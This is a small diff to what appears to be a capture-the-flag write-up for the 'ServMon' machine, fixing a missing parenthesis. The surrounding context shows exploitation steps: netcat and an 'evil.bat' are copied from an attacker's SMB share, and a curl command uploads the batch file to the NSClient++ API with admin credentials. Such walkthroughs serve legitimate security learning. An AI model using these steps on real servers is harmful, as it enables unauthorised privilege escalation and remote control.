@@ -301,7 +301,7 @@ nadine@SERVMON c:\Temp>copy \\10.10.14.64\share\nc.exe .
 nadine@SERVMON c:\Temp>copy \\10.10.14.64\share\evil.bat .
         1 file(s) copied.
 ```
-We got our files uploaded, now let's load them on the `NSClient++` server again using the API (note: do this in `c:\temp`:
+We got our files uploaded, now let's load them on the `NSClient++` server again using the API (note: do this in `c:\temp`):
 ```
 curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary @evil.bat
 ```
